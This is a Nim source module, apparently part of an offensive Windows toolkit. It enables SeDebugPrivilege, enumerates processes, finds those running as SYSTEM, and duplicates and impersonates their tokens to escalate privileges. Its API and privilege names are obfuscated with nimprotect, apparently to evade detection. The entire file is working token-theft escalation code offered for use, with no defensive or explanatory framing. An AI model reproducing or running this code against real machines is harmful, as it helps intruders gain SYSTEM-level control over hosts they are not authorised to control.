import nimprotect
import winim/com
import winim
import priv

var systemSID = protectString("S-1-5-18")


proc convertsid_to_stringSidA(Sid: PSID, StringSir: ptr LPSTR): NTSTATUS {.cdecl, importc: protectString("Convertsid_to_stringSidA"), dynlib: protectString("Advapi32.dll").}


proc sid_to_string(sid: PSID): string =
    var lpSid: LPSTR
    discard convertsid_to_stringSidA(sid, addr lpSid)
    return $cstring(lpSid)


proc is_process_system(pid: int): bool =
    
    # inits
    var hProcess: HANDLE
    var hToken: HANDLE
    var pUser: TOKEN_USER
    var dwLength: DWORD
    var dwPid = cast[DWORD](pid)
    
    # open process
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid)
    defer: CloseHandle(hProcess)
    if hProcess == cast[DWORD](-1) or hProcess == cast[DWORD](NULL):
        return false
    
    # open process token
    if OpenProcessToken(hProcess, TOKEN_QUERY, cast[PHANDLE](hToken.addr)) == FALSE:
        return false
    defer: CloseHandle(hToken)
    if hToken == cast[HANDLE](-1) or hToken == cast[HANDLE](NULL):
        return false
    
    # get required buffer size and allocate the TOKEN_USER buffer
    GetTokenInformation(hToken, tokenUser, cast[LPVOID](pUser.addr), cast[DWORD](0), cast[PDWORD](dwLength.addr))
    
    # extract token information
    GetTokenInformation(hToken, tokenUser, pUser.addr, cast[DWORD](dwLength), cast[PDWORD](dwLength.addr))

    # extract the SID from the token and compare with SYSTEM
    if sid_to_string(pUser.User.Sid) == systemSID:
        return true
    
    return false


proc impersonate*(pid: int): bool =
    
    # inits
    var is_success: BOOL
    var hProcess: HANDLE
    var hToken: HANDLE
    var newToken: HANDLE

    # open process
    hProcess = OpenProcess(MAXIMUM_ALLOWED, TRUE, pid.DWORD)
    defer: CloseHandle(hProcess)
    if hProcess == 0:
        return false

    # open process token
    is_success = OpenProcessToken(hProcess, MAXIMUM_ALLOWED, addr hToken)
    if is_success == FALSE:
        return false

    # duplicate process token
    is_success = DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nil, securityImpersonation, tokenPrimary, addr newToken)
    if bool(is_success) == FALSE:
        return false

    # impersonate user
    is_success = ImpersonateLoggedOnUser(newToken)
    if is_success == FALSE:
        return false

    # cleanup
    CloseHandle(hToken)
    CloseHandle(newToken)
    

proc impersonate_system*(): bool =

    # inits
    var entry: PROCESSENTRY32
    var hSnapshot: HANDLE
    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))

    # enable SeDebugPrivilege
    if not set_privilege(protectString("SeDebugPrivilege")):
        return false

    # get all processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)
    if Process32First(hSnapshot, addr entry):
        # iterate all processes and try to steal token from each SYSTEM process
        while Process32Next(hSnapshot, addr entry):
            if is_process_system(entry.th32ProcessID):
                if impersonate(entry.th32ProcessID):
                    return true
    return false


proc rev2self*(): bool =
        
    if RevertToSelf():
        return true
    else:
        return false
